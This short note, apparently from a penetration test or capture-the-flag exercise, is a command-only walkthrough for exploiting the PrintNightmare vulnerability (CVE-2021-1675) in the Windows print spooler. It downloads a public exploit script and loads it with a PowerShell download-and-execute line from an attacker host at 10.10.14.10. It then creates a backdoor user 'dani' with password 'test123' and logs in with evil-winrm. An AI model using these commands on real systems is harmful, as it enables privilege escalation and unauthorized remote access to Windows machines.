____

spoolsv.exe

https://github.com/calebstewart/CVE-2021-1675

```bash
wget https://raw.githubusercontent.com/calebstewart/CVE-2021-1675/main/CVE-2021-1675.ps1
```


```cmd
IEX(New-Object Net.WebClient).downloadString('http://10.10.14.10/CVE-2021-1675.ps1')
```


```cmd
Invoke-Nightmare -DriverName "Xerox" -NewUser "dani" -NewPassword "test123"
```

```bash
evil-winrm -i $IP -u dani -p 'test123'
```
